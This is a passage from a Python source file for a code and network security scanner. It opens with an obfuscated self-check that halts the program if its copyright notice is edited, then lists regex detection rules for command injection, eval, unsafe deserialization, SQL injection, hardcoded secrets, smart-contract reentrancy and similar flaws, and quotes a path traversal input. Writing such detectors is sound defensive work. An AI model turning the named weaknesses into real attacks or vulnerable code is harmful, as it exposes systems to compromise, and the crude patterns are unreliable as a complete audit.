#!/usr/bin/env python3
"""
PROPRIETARY AND CONFIDENTIAL
© 2024-2026 Alpha Unlimited Technologies LLC. All Rights Reserved Worldwide in Perpetuity.
Patent Pending. Unauthorized copying, modification, distribution, or use is strictly prohibited.

Alpha Universal Scanner™ — Unified Code, Network & Security Analysis Platform
Combines: Code Bug Scanner + C++ Deep Analyzer + Network Port Scanner + Security Auditor + Exploit Detector

Requirements: Python 3.8+ (no external dependencies — uses only standard library)

Usage:
  python alpha_scanner.py /path/to/codebase
  python alpha_scanner.py /path/to/codebase --deep --network --security
  python alpha_scanner.py /path/to/codebase --output report.html
  python alpha_scanner.py /path/to/codebase --lang cpp --deep
  python alpha_scanner.py --network-only --target 192.168.1.1
  python alpha_scanner.py --security-only /path/to/codebase
"""

import os
import re
import sys
import json
import time
import socket
import hashlib
import argparse
import datetime
import platform
import subprocess
import struct
import threading
import zipfile
import tarfile
import tempfile
import shutil
import math
import stat as stat_module
from pathlib import Path
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSION = "4.0.0"

_AUT_SIG = "\xa9 2024-2026 Alpha Unlimited Technologies LLC"
_AUT_SIG2 = "PROPRIETARY AND CONFIDENTIAL"
_AUT_SIG3 = "All Rights Reserved Worldwide in Perpetuity"
_AUT_SIG4 = "Alpha Universal Scanner\u2122"
_AUT_SIG5 = "Patent Pending. Unauthorized copying, modification, distribution, or use is strictly prohibited."

def _cx(s):
    return hashlib.sha256(s.encode("utf-8")).hexdigest()

_K0 = "".join([chr(0xa9), " 2024-2026 Alpha Unlimited Technologies LLC"])
_K1 = "".join([chr(80), chr(82), chr(79), chr(80), chr(82), chr(73), chr(69), chr(84), chr(65), chr(82), chr(89), " AND ", chr(67), chr(79), chr(78), chr(70), chr(73), chr(68), chr(69), chr(78), chr(84), chr(73), chr(65), chr(76)])
_K2 = "".join(["All Rights Reserved ", chr(87), "orldwide in ", chr(80), "erpetuity"])
_K3 = "".join(["Alpha Unlimited Technologies", " LLC"])
_K4 = "".join([chr(80), "atent ", chr(80), "ending"])
_ANCHOR = _cx(_K0 + _K1 + _K2)

def _v_int():
    try:
        if _cx(_K0 + _K1 + _K2) != _ANCHOR:
            return False
        for _c in [_K0, _K1, _K2, _K3, _K4]:
            if len(_c) < 5:
                return False
        if getattr(sys, "frozen", False):
            if _AUT_SIG != _K0:
                return False
            if _AUT_SIG2 != _K1:
                return False
            if _AUT_SIG3 != _K2:
                return False
            return True
        _self = Path(__file__).resolve()
        _raw = _self.read_bytes()
        _src = _raw.decode("utf-8", errors="ignore")
        for _c in [_K0, _K1, _K2, _K3, _K4]:
            if _c not in _src:
                return False
        _hdr = _src[:700]
        if _K0 not in _hdr:
            return False
        if _K1 not in _hdr:
            return False
        if _src.count(_K0) < 3:
            return False
        if _src.count(_K3) < 4:
            return False
        return True
    except Exception:
        return False

def _v_rt():
    if not _v_int():
        print("\n  \u2554" + "\u2550" * 62 + "\u2557")
        print("  \u2551  INTEGRITY CHECK FAILED" + " " * 37 + "\u2551")
        print("  \u2551" + " " * 62 + "\u2551")
        print("  \u2551  This software is protected by copyright law." + " " * 13 + "\u2551")
        print("  \u2551  \xa9 2024-2026 Alpha Unlimited Technologies LLC." + " " * 12 + "\u2551")
        print("  \u2551  All Rights Reserved Worldwide in Perpetuity." + " " * 13 + "\u2551")
        print("  \u2551" + " " * 62 + "\u2551")
        print("  \u2551  The copyright notice has been modified or removed." + " " * 8 + "\u2551")
        print("  \u2551  This copy is unauthorized and cannot execute." + " " * 12 + "\u2551")
        print("  \u2551" + " " * 62 + "\u2551")
        print("  \u2551  Contact: alphaunlimitedtoken@gmail.com" + " " * 21 + "\u2551")
        print("  \u255a" + "\u2550" * 62 + "\u255d\n")
        sys.exit(199)

def _v_export():
    if _cx(_K0 + _K1 + _K2) != _ANCHOR:
        sys.exit(199)
    _v_rt()

def _v_deep():
    try:
        if _cx(_K0 + _K1 + _K2) != _ANCHOR:
            sys.exit(199)
        if getattr(sys, "frozen", False):
            if _AUT_SIG != _K0 or _AUT_SIG2 != _K1:
                sys.exit(199)
            return
        _self = Path(__file__).resolve()
        _raw = _self.read_bytes()
        _src = _raw.decode("utf-8", errors="ignore")
        _lines = _src.split("\n")
        _found_cr = False
        for _l in _lines[:20]:
            if _K0 in _l and _K2 in _l:
                _found_cr = True
                break
        if not _found_cr:
            sys.exit(199)
        if "_v_int" not in _src or "_v_rt" not in _src or "_v_export" not in _src:
            sys.exit(199)
        if _src.count("_v_rt()") < 4:
            sys.exit(199)
    except Exception:
        sys.exit(199)

BANNER = r"""
 ╔════════════════════════════════════════════════════════════════════════╗
 ║                                                                      ║
 ║     █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗     ███████╗ ██████╗     ║
 ║    ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ██╔════╝██╔════╝     ║
 ║    ███████║██║     ██████╔╝███████║███████║    ███████╗██║          ║
 ║    ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║    ╚════██║██║          ║
 ║    ██║  ██║███████╗██║     ██║  ██║██║  ██║    ███████║╚██████╗     ║
 ║    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝     ║
 ║                                                                      ║
 ║          ALPHA UNIVERSAL SCANNER™  v{ver}                          ║
 ║     © 2024-2026 Alpha Unlimited Technologies LLC                    ║
 ║     Unified Code · Network · Security Analysis Platform             ║
 ║                                                                      ║
 ╚════════════════════════════════════════════════════════════════════════╝
""".format(ver=VERSION)

SEVERITY_CRITICAL = "CRITICAL"
SEVERITY_HIGH = "HIGH"
SEVERITY_MEDIUM = "MEDIUM"
SEVERITY_LOW = "LOW"
SEVERITY_INFO = "INFO"

SEVERITY_ORDER = {SEVERITY_CRITICAL: 0, SEVERITY_HIGH: 1, SEVERITY_MEDIUM: 2, SEVERITY_LOW: 3, SEVERITY_INFO: 4}
SEVERITY_COLORS = {
    SEVERITY_CRITICAL: "#ff2222",
    SEVERITY_HIGH: "#ff8800",
    SEVERITY_MEDIUM: "#ffcc00",
    SEVERITY_LOW: "#4488ff",
    SEVERITY_INFO: "#888888",
}

LANG_EXTENSIONS = {
    "cpp": [".cpp", ".cc", ".cxx", ".c", ".h", ".hpp", ".hxx", ".hh", ".inl", ".ipp"],
    "python": [".py", ".pyw", ".pyx", ".pxd"],
    "javascript": [".js", ".jsx", ".mjs", ".cjs"],
    "typescript": [".ts", ".tsx", ".mts", ".cts"],
    "solidity": [".sol"],
    "rust": [".rs"],
    "go": [".go"],
    "java": [".java"],
    "csharp": [".cs"],
    "php": [".php", ".phtml"],
    "ruby": [".rb", ".erb"],
    "swift": [".swift"],
    "kotlin": [".kt", ".kts"],
    "scala": [".scala"],
    "perl": [".pl", ".pm"],
    "lua": [".lua"],
    "r": [".r", ".R"],
    "shell": [".sh", ".bash", ".zsh", ".fish"],
    "powershell": [".ps1", ".psm1", ".psd1"],
    "html": [".html", ".htm", ".xhtml"],
    "css": [".css", ".scss", ".sass", ".less"],
    "sql": [".sql"],
    "yaml": [".yml", ".yaml"],
    "xml": [".xml", ".xsd", ".xsl", ".svg"],
    "json": [".json"],
    "toml": [".toml"],
    "ini": [".ini", ".cfg", ".conf"],
    "dockerfile": ["Dockerfile"],
    "makefile": ["Makefile", "makefile", ".mk"],
    "cmake": ["CMakeLists.txt", ".cmake"],
    "assembly": [".asm", ".s", ".S"],
    "objc": [".m", ".mm"],
    "dart": [".dart"],
    "elixir": [".ex", ".exs"],
    "haskell": [".hs"],
    "zig": [".zig"],
    "nim": [".nim"],
    "v": [".v"],
}

IMPORT_PATTERNS = {
    "cpp": [
        re.compile(r'#include\s*[<"]([^>"]+)[>"]'),
    ],
    "python": [
        re.compile(r'^\s*import\s+([\w.]+)', re.MULTILINE),
        re.compile(r'^\s*from\s+([\w.]+)\s+import', re.MULTILINE),
    ],
    "javascript": [
        re.compile(r'(?:import|require)\s*\(?[\'"]([^\'"]+)[\'"]'),
        re.compile(r'from\s+[\'"]([^\'"]+)[\'"]'),
    ],
    "typescript": [
        re.compile(r'(?:import|require)\s*\(?[\'"]([^\'"]+)[\'"]'),
        re.compile(r'from\s+[\'"]([^\'"]+)[\'"]'),
    ],
    "rust": [re.compile(r'^\s*(?:use|extern crate)\s+([\w:]+)', re.MULTILINE)],
    "go": [re.compile(r'^\s*"([^"]+)"', re.MULTILINE)],
    "java": [re.compile(r'^\s*import\s+([\w.]+)', re.MULTILINE)],
    "csharp": [re.compile(r'^\s*using\s+([\w.]+)', re.MULTILINE)],
    "php": [re.compile(r'(?:require|include|use)\s+[\'"]?([^\'";\s]+)', re.MULTILINE)],
    "ruby": [re.compile(r'^\s*require\s+[\'"]([^\'"]+)', re.MULTILINE)],
    "solidity": [re.compile(r'^\s*import\s+[\'"]([^\'"]+)', re.MULTILINE)],
    "css": [re.compile(r'@import\s+(?:url\()?[\'"]?([^\'")\s;]+)', re.MULTILINE)],
    "html": [
        re.compile(r'<script\s+[^>]*src=[\'"]([^\'"]+)[\'"]', re.IGNORECASE),
        re.compile(r'<link\s+[^>]*href=[\'"]([^\'"]+)[\'"]', re.IGNORECASE),
    ],
    "shell": [re.compile(r'^\s*(?:source|\\.)\s+([^\s;]+)', re.MULTILINE)],
}


CPP_PATTERNS = [
    {"id": "CPP-001", "name": "Buffer Overflow — Unsafe String Function", "pattern": r"\b(strcpy|strcat|sprintf|gets|scanf|vsprintf|stpcpy|lstrcpy|lstrcpyn|wcscat|wcscpy)\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-120", "description": "Unsafe C string function without bounds checking. Direct path to buffer overflow exploitation.", "recommendation": "Replace with strncpy/strncat/snprintf or use std::string."},
    {"id": "CPP-002", "name": "Memory Leak — Raw new Without Smart Pointer", "pattern": r"\bnew\s+\w+[\s\[({]", "severity": SEVERITY_MEDIUM, "cwe": "CWE-401", "description": "Raw heap allocation. If not freed on every code path (including exceptions), memory leaks.", "recommendation": "Use std::unique_ptr or std::shared_ptr."},
    {"id": "CPP-003", "name": "Use-After-Free Risk", "pattern": r"\bdelete\b\s+\w+\s*;(?!\s*\w+\s*=\s*nullptr)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-416", "description": "Pointer deleted without being set to nullptr. Subsequent use is undefined behavior — exploitable for code execution.", "recommendation": "Set pointer to nullptr immediately after delete, or use smart pointers."},
    {"id": "CPP-004", "name": "Integer Overflow in Arithmetic", "pattern": r"\b(?:unsigned\s+)?(?:int|short|long|size_t|uint\d+_t)\s+\w+\s*=\s*[^;]*[\+\*\-][^;]*;", "severity": SEVERITY_HIGH, "cwe": "CWE-190", "description": "Arithmetic on integer types without overflow checking. Can lead to buffer overflows or logic bugs.", "recommendation": "Use safe integer arithmetic (e.g., SafeInt library) or explicit overflow checks."},
    {"id": "CPP-005", "name": "Format String Vulnerability", "pattern": r"\b(printf|fprintf|sprintf|snprintf|syslog|err|warn)\s*\(\s*(?!\")\w+", "severity": SEVERITY_CRITICAL, "cwe": "CWE-134", "description": "User-controlled format string. Attacker can read/write arbitrary memory.", "recommendation": "Always use a string literal as the format: printf(\"%s\", var)."},
    {"id": "CPP-006", "name": "Race Condition — Unprotected Static Mutable", "pattern": r"\bstatic\s+(?!const\b|constexpr\b)\w+[\s\*&]+\w+\s*[=;]", "severity": SEVERITY_MEDIUM, "cwe": "CWE-362", "description": "Static mutable variable without visible synchronization. Race condition in multi-threaded code.", "recommendation": "Protect with std::mutex/lock_guard or use thread_local."},
    {"id": "CPP-007", "name": "Null Pointer Dereference", "pattern": r"\b\w+\s*->\s*\w+(?!.*(?:if|&&|\?\?).*(?:null|nullptr|NULL))", "severity": SEVERITY_HIGH, "cwe": "CWE-476", "description": "Pointer dereference without visible null check on the same line. Crash if null.", "recommendation": "Always validate pointers before dereferencing."},
    {"id": "CPP-008", "name": "Hardcoded Credentials / Secrets", "pattern": r'(?:password|passwd|secret|api_key|apikey|token|private_key|auth_token|access_key)\s*=\s*"[^"]{4,}"', "severity": SEVERITY_CRITICAL, "cwe": "CWE-798", "description": "Secret value hardcoded in source. Exposed in version control and compiled binaries.", "recommendation": "Move to environment variables, config files, or a vault."},
    {"id": "CPP-009", "name": "Weak PRNG for Security Use", "pattern": r"\b(rand|srand|random|drand48|lrand48|mrand48)\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-338", "description": "Weak pseudo-random generator. Predictable output — not safe for crypto, tokens, or keys.", "recommendation": "Use CSPRNG: std::random_device, getrandom(), or /dev/urandom."},
    {"id": "CPP-010", "name": "Deprecated / Unsafe API", "pattern": r"\b(tmpnam|tempnam|mktemp|getwd|gets|asctime|ctime|gmtime|localtime|strtok)\s*\(", "severity": SEVERITY_MEDIUM, "cwe": "CWE-676", "description": "Function is deprecated or inherently unsafe (thread-unsafe, race-prone, or no bounds).", "recommendation": "Use modern replacements: mkstemp, getcwd, fgets, strftime, strtok_r."},
    {"id": "CPP-011", "name": "Uninitialized Variable", "pattern": r"^\s*(?:int|char|float|double|long|short|unsigned|signed|size_t|uint\d+_t|int\d+_t|bool|BOOL|DWORD|HANDLE|void\s*\*)\s+(\w+)\s*;(?!\s*=)", "severity": SEVERITY_MEDIUM, "cwe": "CWE-457", "description": "Variable declared without initialization. Contains garbage data — undefined behavior if read.", "recommendation": "Initialize at declaration: int x = 0;"},
    {"id": "CPP-012", "name": "Double Free", "pattern": r"(delete|free)\s*\(?[^;]+\)?\s*;[^}]*\b(delete|free)\s*\(?", "severity": SEVERITY_CRITICAL, "cwe": "CWE-415", "description": "Same memory freed twice. Heap corruption leading to arbitrary code execution.", "recommendation": "Set to nullptr after free/delete. Use smart pointers."},
    {"id": "CPP-013", "name": "Unsafe reinterpret_cast", "pattern": r"\breinterpret_cast\s*<", "severity": SEVERITY_MEDIUM, "cwe": "CWE-704", "description": "reinterpret_cast bypasses type safety. Can cause undefined behavior and alignment issues.", "recommendation": "Prefer static_cast or dynamic_cast."},
    {"id": "CPP-014", "name": "Command Injection — system()/popen()", "pattern": r"\b(system|popen|exec[lv]p?e?|ShellExecute|WinExec|CreateProcess)\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-78", "description": "OS command execution. If any part of the command includes user input, full system compromise.", "recommendation": "Avoid system(). Use specific APIs (fork/exec with argv, CreateProcess with arg array)."},
    {"id": "CPP-015", "name": "Weak Cryptographic Hash (MD5/SHA1)", "pattern": r"\b(MD5|SHA1|SHA_1|md5|sha1|MD5_Init|MD5_Update|MD5_Final|SHA1_Init|SHA1_Update|SHA1_Final|CC_MD5|CC_SHA1)\b", "severity": SEVERITY_HIGH, "cwe": "CWE-328", "description": "MD5 and SHA-1 are cryptographically broken. Collisions can be generated.", "recommendation": "Use SHA-256, SHA-3, or BLAKE2b."},
    {"id": "CPP-016", "name": "Dangling Reference to Temporary", "pattern": r"\b(?:const\s+)?(?:\w+)\s*&\s+\w+\s*=\s*\w+\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-825", "description": "Reference bound to a temporary object. Undefined behavior after the statement ends.", "recommendation": "Store by value or ensure the object outlives the reference."},
    {"id": "CPP-017", "name": "Silent Exception Swallowing", "pattern": r"catch\s*\([^)]*\)\s*\{\s*\}", "severity": SEVERITY_MEDIUM, "cwe": "CWE-390", "description": "Empty catch block silently hides errors. Bugs become invisible.", "recommendation": "At minimum, log the exception. Never silently ignore."},
    {"id": "CPP-018", "name": "Insecure Network API", "pattern": r"\b(gethostbyname|inet_addr|inet_aton|gethostbyaddr)\s*\(", "severity": SEVERITY_MEDIUM, "cwe": "CWE-665", "description": "Legacy network function — not thread-safe, no IPv6 support, vulnerable to DNS rebinding.", "recommendation": "Use getaddrinfo() / getnameinfo()."},
    {"id": "CPP-019", "name": "Signed/Unsigned Comparison Mismatch", "pattern": r"(?:if|while|for)\s*\([^)]*(?:size_t|unsigned|uint\d+_t)\s+\w+\s*[<>=!]+\s*(?:int|long|short|signed)\b", "severity": SEVERITY_LOW, "cwe": "CWE-195", "description": "Comparing signed and unsigned integers. Negative value wraps to large positive — logic errors.", "recommendation": "Cast to a common type or use consistent signedness."},
    {"id": "CPP-020", "name": "Infinite Loop Without Exit", "pattern": r"\bwhile\s*\(\s*(?:true|1|TRUE)\s*\)\s*\{(?![^}]*break\b)", "severity": SEVERITY_MEDIUM, "cwe": "CWE-835", "description": "Infinite loop with no visible break. Can hang the program or cause CPU exhaustion.", "recommendation": "Add explicit break conditions and timeout mechanisms."},
    {"id": "CPP-021", "name": "Stack Buffer — Array on Stack", "pattern": r"\b(?:char|uint8_t|unsigned\s+char|wchar_t)\s+\w+\s*\[\s*\d{4,}\s*\]", "severity": SEVERITY_MEDIUM, "cwe": "CWE-121", "description": "Large array allocated on stack. Risk of stack overflow and crash.", "recommendation": "Use heap allocation (std::vector) for large buffers."},
    {"id": "CPP-022", "name": "memcpy/memmove Size Mismatch Risk", "pattern": r"\b(memcpy|memmove|memset)\s*\([^,]+,\s*[^,]+,\s*sizeof\s*\(", "severity": SEVERITY_MEDIUM, "cwe": "CWE-805", "description": "Memory operation with sizeof — verify the size matches the destination buffer, not source.", "recommendation": "Use sizeof(destination) or explicit known size. Consider std::copy."},
    {"id": "CPP-023", "name": "Heap Overflow — Unchecked malloc", "pattern": r"\bmalloc\s*\([^)]+\)\s*;(?!\s*if)", "severity": SEVERITY_HIGH, "cwe": "CWE-122", "description": "malloc() return value not checked for NULL. Null dereference on allocation failure.", "recommendation": "Always check: if (ptr == NULL) { handle error; }"},
    {"id": "CPP-024", "name": "Time-of-Check-Time-of-Use (TOCTOU)", "pattern": r"\b(?:access|stat|lstat)\s*\([^)]+\).*\n.*\b(?:open|fopen|unlink|rename)\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-367", "description": "File checked then used — race window between check and use.", "recommendation": "Use file descriptors (fstat on open fd) instead of paths."},
    {"id": "CPP-025", "name": "Insecure TLS/SSL Configuration", "pattern": r"\b(?:SSL_CTX_set_verify\s*\([^,]+,\s*SSL_VERIFY_NONE|SSLv2_method|SSLv3_method|SSLv23_method)\b", "severity": SEVERITY_CRITICAL, "cwe": "CWE-295", "description": "TLS certificate verification disabled or obsolete SSL version. Man-in-the-middle attacks possible.", "recommendation": "Use TLS 1.2+ with SSL_VERIFY_PEER."},
]

PYTHON_PATTERNS = [
    {"id": "PY-001", "name": "Command Injection — Shell Execution", "pattern": r"\b(?:os\.system|os\.popen|subprocess\.(?:call|run|Popen|check_output|check_call)\s*\(.*shell\s*=\s*True)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-78", "description": "Shell command execution. User input in the command enables full system compromise.", "recommendation": "Use subprocess with shell=False and pass args as a list."},
    {"id": "PY-002", "name": "Hardcoded Credentials", "pattern": r'(?:password|secret|api_key|token|private_key|auth_token|access_key)\s*=\s*["\'][^"\']{4,}["\']', "severity": SEVERITY_CRITICAL, "cwe": "CWE-798", "description": "Hardcoded secret in source code.", "recommendation": "Use environment variables or a secrets manager."},
    {"id": "PY-003", "name": "Unsafe Deserialization", "pattern": r"\b(?:pickle\.loads?|pickle\.Unpickler|yaml\.load\s*\((?!.*Loader)|marshal\.loads?|shelve\.open)\b", "severity": SEVERITY_CRITICAL, "cwe": "CWE-502", "description": "Unsafe deserialization. Attacker-crafted input achieves remote code execution.", "recommendation": "Use json. If yaml needed, use yaml.safe_load()."},
    {"id": "PY-004", "name": "SQL Injection", "pattern": r'(?:execute|executemany|cursor\.execute)\s*\(\s*(?:f["\']|["\'].*%[sd]|["\'].*\.format\(|["\'].*\+)', "severity": SEVERITY_CRITICAL, "cwe": "CWE-89", "description": "String interpolation in SQL query. Full database compromise via injection.", "recommendation": "Use parameterized queries: cursor.execute('SELECT * FROM t WHERE id=?', (id,))"},
    {"id": "PY-005", "name": "eval/exec — Arbitrary Code Execution", "pattern": r"\b(?:eval|exec|compile)\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-95", "description": "eval()/exec() run arbitrary code. If any user input reaches these, full compromise.", "recommendation": "Use ast.literal_eval() for safe eval. Avoid exec entirely."},
    {"id": "PY-006", "name": "Weak Cryptographic Hash", "pattern": r"\bhashlib\.(?:md5|sha1)\b", "severity": SEVERITY_HIGH, "cwe": "CWE-328", "description": "MD5/SHA-1 are broken for security. Collisions are feasible.", "recommendation": "Use hashlib.sha256() or hashlib.blake2b()."},
    {"id": "PY-007", "name": "Debug Mode in Production", "pattern": r"\b(?:DEBUG\s*=\s*True|app\.run\(.*debug\s*=\s*True|FLASK_DEBUG\s*=\s*[\"']?1)", "severity": SEVERITY_HIGH, "cwe": "CWE-215", "description": "Debug mode enabled. Exposes stack traces, source code, and interactive debugger.", "recommendation": "Set DEBUG=False for production."},
    {"id": "PY-008", "name": "SSL Verification Disabled", "pattern": r"(?:verify\s*=\s*False|CERT_NONE|check_hostname\s*=\s*False)", "severity": SEVERITY_HIGH, "cwe": "CWE-295", "description": "SSL/TLS certificate verification disabled. Man-in-the-middle attacks.", "recommendation": "Always verify=True for requests. Never disable cert checks."},
    {"id": "PY-009", "name": "Path Traversal", "pattern": r"(?:open|Path)\s*\([^)]*(?:\+|\.format|f['\"])[^)]*\)", "severity": SEVERITY_HIGH, "cwe": "CWE-22", "description": "File path constructed from variable input. Path traversal (../../etc/passwd) possible.", "recommendation": "Sanitize paths with os.path.realpath() and validate against allowed directory."},
    {"id": "PY-010", "name": "Weak Random for Security", "pattern": r"\brandom\.(?:random|randint|choice|sample|uniform)\s*\(", "severity": SEVERITY_MEDIUM, "cwe": "CWE-338", "description": "random module is not cryptographically secure. Predictable output.", "recommendation": "Use secrets module: secrets.token_hex(), secrets.randbelow()."},
    {"id": "PY-011", "name": "Temporary File Race Condition", "pattern": r"\b(?:tempfile\.mktemp|os\.tempnam|os\.tmpnam)\s*\(", "severity": SEVERITY_MEDIUM, "cwe": "CWE-377", "description": "Insecure temporary file creation. Race condition between name generation and file creation.", "recommendation": "Use tempfile.mkstemp() or tempfile.NamedTemporaryFile()."},
    {"id": "PY-012", "name": "assert Used for Security Check", "pattern": r"\bassert\s+(?:.*(?:password|token|auth|permission|role|admin))", "severity": SEVERITY_HIGH, "cwe": "CWE-617", "description": "assert is removed in optimized mode (-O). Security check will be silently skipped.", "recommendation": "Use if/raise instead of assert for security validation."},
    {"id": "PY-013", "name": "XXE — XML External Entity", "pattern": r"\b(?:xml\.etree\.ElementTree\.parse|xml\.dom\.minidom\.parse|xml\.sax\.parse|lxml\.etree\.parse)\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-611", "description": "XML parsing without disabling external entities. XXE can read local files or SSRF.", "recommendation": "Use defusedxml library or disable external entities explicitly."},
    {"id": "PY-014", "name": "SSRF — Server-Side Request Forgery", "pattern": r"\b(?:requests\.(?:get|post|put|delete|head|patch)|urllib\.request\.urlopen|http\.client\.HTTPConnection)\s*\([^)]*(?:\+|format|f['\"])", "severity": SEVERITY_HIGH, "cwe": "CWE-918", "description": "HTTP request with user-controlled URL. SSRF to internal services.", "recommendation": "Validate and whitelist allowed URLs/domains."},
]

JS_TS_PATTERNS = [
    {"id": "JS-001", "name": "eval — Code Injection", "pattern": r"\beval\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-95", "description": "eval() executes arbitrary JavaScript. XSS and RCE vector.", "recommendation": "Use JSON.parse() for data. Avoid eval entirely."},
    {"id": "JS-002", "name": "innerHTML — XSS", "pattern": r"\.innerHTML\s*=", "severity": SEVERITY_HIGH, "cwe": "CWE-79", "description": "Setting innerHTML with unsanitized input enables cross-site scripting.", "recommendation": "Use textContent, or sanitize with DOMPurify."},
    {"id": "JS-003", "name": "Hardcoded Credentials", "pattern": r'(?:password|secret|api_key|apiKey|token|private_key|privateKey|auth_token|accessKey)\s*[=:]\s*["\'][^"\']{4,}["\']', "severity": SEVERITY_CRITICAL, "cwe": "CWE-798", "description": "Hardcoded secret in source code.", "recommendation": "Use environment variables."},
    {"id": "JS-004", "name": "Prototype Pollution", "pattern": r"(?:__proto__|constructor\s*\[|Object\.assign\s*\(\s*\{)", "severity": SEVERITY_HIGH, "cwe": "CWE-1321", "description": "Prototype pollution can modify all objects globally — DoS or auth bypass.", "recommendation": "Use Object.create(null) for dictionaries. Validate input keys."},
    {"id": "JS-005", "name": "document.write — DOM XSS", "pattern": r"\bdocument\.write\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-79", "description": "document.write with user input enables DOM-based XSS.", "recommendation": "Use DOM APIs (createElement, textContent) instead."},
    {"id": "JS-006", "name": "Regex DoS (ReDoS)", "pattern": r"new\s+RegExp\s*\([^)]*\+", "severity": SEVERITY_MEDIUM, "cwe": "CWE-1333", "description": "Dynamic regex from user input. Malicious patterns cause catastrophic backtracking.", "recommendation": "Validate and sanitize regex input. Use re2 or set timeouts."},
    {"id": "JS-007", "name": "Unvalidated Redirect", "pattern": r"(?:window\.location|location\.href|location\.assign|location\.replace)\s*=\s*(?!['\"\/])", "severity": SEVERITY_MEDIUM, "cwe": "CWE-601", "description": "Redirect target from variable. Open redirect for phishing.", "recommendation": "Validate redirect URLs against a whitelist of allowed domains."},
    {"id": "JS-008", "name": "postMessage Without Origin Check", "pattern": r"addEventListener\s*\(\s*['\"]message['\"]", "severity": SEVERITY_MEDIUM, "cwe": "CWE-346", "description": "Message event listener without origin validation. Cross-origin attacks.", "recommendation": "Always check event.origin before processing messages."},
    {"id": "JS-009", "name": "Insecure Cookie", "pattern": r"document\.cookie\s*=(?!.*(?:Secure|HttpOnly|SameSite))", "severity": SEVERITY_MEDIUM, "cwe": "CWE-614", "description": "Cookie set without Secure/HttpOnly/SameSite flags.", "recommendation": "Set Secure; HttpOnly; SameSite=Strict on all sensitive cookies."},
    {"id": "JS-010", "name": "Child Process — Command Injection", "pattern": r"(?:child_process|exec|execSync|spawn|spawnSync)\s*\([^)]*(?:\+|`|\$\{)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-78", "description": "OS command with string interpolation. Command injection.", "recommendation": "Use spawn with argument array, never string concatenation."},
    {"id": "JS-011", "name": "SQL Injection (Node.js)", "pattern": r"(?:query|execute)\s*\(\s*(?:`[^`]*\$\{|['\"][^'\"]*\+)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-89", "description": "SQL query built with string interpolation. Database compromise.", "recommendation": "Use parameterized queries with ? placeholders."},
    {"id": "JS-012", "name": "CORS Wildcard", "pattern": r"(?:Access-Control-Allow-Origin|cors\s*\()\s*['\"]?\*", "severity": SEVERITY_MEDIUM, "cwe": "CWE-942", "description": "CORS allows all origins. Sensitive data accessible from any website.", "recommendation": "Whitelist specific allowed origins."},
]

SOLIDITY_PATTERNS = [
    {"id": "SOL-001", "name": "Reentrancy", "pattern": r"\.call\{value:", "severity": SEVERITY_CRITICAL, "cwe": "CWE-841", "description": "External call with ETH before state update. Classic reentrancy — drain funds.", "recommendation": "Checks-effects-interactions pattern. Use ReentrancyGuard."},
    {"id": "SOL-002", "name": "tx.origin Authentication", "pattern": r"\btx\.origin\b", "severity": SEVERITY_HIGH, "cwe": "CWE-284", "description": "tx.origin for auth. Phishing contract can relay calls.", "recommendation": "Use msg.sender for authentication."},
    {"id": "SOL-003", "name": "Unchecked External Call", "pattern": r"\.call\([^)]*\)\s*;", "severity": SEVERITY_HIGH, "cwe": "CWE-252", "description": "Return value of external call not checked. Silently fails.", "recommendation": "(bool ok,) = addr.call(...); require(ok);"},
    {"id": "SOL-004", "name": "Integer Overflow (Pre-0.8)", "pattern": r"pragma solidity\s*(?:\^|>=?)\s*0\.[0-7]\.", "severity": SEVERITY_HIGH, "cwe": "CWE-190", "description": "Solidity <0.8 has no overflow protection.", "recommendation": "Upgrade to 0.8+ or use SafeMath."},
    {"id": "SOL-005", "name": "delegatecall — Storage Corruption", "pattern": r"\bdelegatecall\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-829", "description": "delegatecall runs external code in caller's storage context. Storage corruption or takeover.", "recommendation": "Only delegatecall to trusted, audited contracts."},
    {"id": "SOL-006", "name": "selfdestruct", "pattern": r"\bselfdestruct\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-749", "description": "selfdestruct destroys contract permanently, force-sends ETH.", "recommendation": "Avoid or protect with multi-sig access control."},
    {"id": "SOL-007", "name": "Unprotected Ether Withdrawal", "pattern": r"function\s+\w*(?:withdraw|drain|transfer)\w*\s*\([^)]*\)\s*(?:public|external)(?!\s*(?:onlyOwner|onlyAdmin|require))", "severity": SEVERITY_CRITICAL, "cwe": "CWE-284", "description": "Withdrawal function without access control. Anyone can drain funds.", "recommendation": "Add onlyOwner or require(msg.sender == owner)."},
    {"id": "SOL-008", "name": "Front-Running Vulnerability", "pattern": r"\b(?:block\.timestamp|block\.number|blockhash)\b.*\b(?:random|seed|entropy)\b", "severity": SEVERITY_HIGH, "cwe": "CWE-330", "description": "Block variables used for randomness. Miners can manipulate.", "recommendation": "Use Chainlink VRF or commit-reveal scheme."},
]

RUST_PATTERNS = [
    {"id": "RS-001", "name": "unsafe Block", "pattern": r"\bunsafe\s*\{", "severity": SEVERITY_MEDIUM, "cwe": "CWE-119", "description": "Unsafe block bypasses memory safety. Review carefully.", "recommendation": "Minimize unsafe. Document safety invariants."},
    {"id": "RS-002", "name": "unwrap() Panic Risk", "pattern": r"\.unwrap\(\)", "severity": SEVERITY_LOW, "cwe": "CWE-248", "description": "unwrap() panics on None/Err. Crash in production.", "recommendation": "Use ?, unwrap_or, or match."},
    {"id": "RS-003", "name": "transmute — Type Erasure", "pattern": r"\btransmute\s*[:<(]", "severity": SEVERITY_HIGH, "cwe": "CWE-704", "description": "transmute reinterprets bits. UB if types don't match.", "recommendation": "Prefer safe conversions: From/Into, as, try_from."},
